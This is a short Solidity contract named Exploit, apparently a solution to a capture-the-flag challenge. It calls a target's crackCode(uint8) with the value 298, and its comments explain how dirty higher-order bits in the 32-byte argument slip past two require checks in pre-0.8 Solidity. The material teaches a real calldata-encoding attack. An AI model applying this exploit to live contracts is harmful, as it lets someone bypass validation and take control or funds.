pragma solidity 0.7.6;

contract Exploit {

  address pixelPavelContract;

  constructor(address _pixelPavelContract) {
    pixelPavelContract = _pixelPavelContract;
  }

  function finalize() external {
    /* We need to pass in 42 as a parameter to get past the first 'require'.
      However, we also need to pass in a value of 298 to pass the second check.

      So how do we do that? Dirty higher order bits.

      The parameter is a uint8 but every function parameter is always 32 bytes.
      So we exploit this by sneaking in some other values in the bytes that will be
      ignored by the function parameter.
      
      So what we need to do is pass in the value 298, which is represented in hex as `12a`,
      which will cleanly map to a hex uint8 value of '2a', which allows us to pass
      the first require.

      To pass the second require, we simply just need to make sure the bytes comparison
      matches, which it will do if we pass in the value 298.

      Note, this only works in pre Solidity 0.8. Since then the runtime will revert
      in the event of dirty higher order bits.

    */
    bytes memory data = abi.encodeWithSignature("crackCode(uint8)", 298);
    (bool success, bytes memory returnData) = pixelPavelContract.call(data);
    require(success, "Finalize failed");
  }
}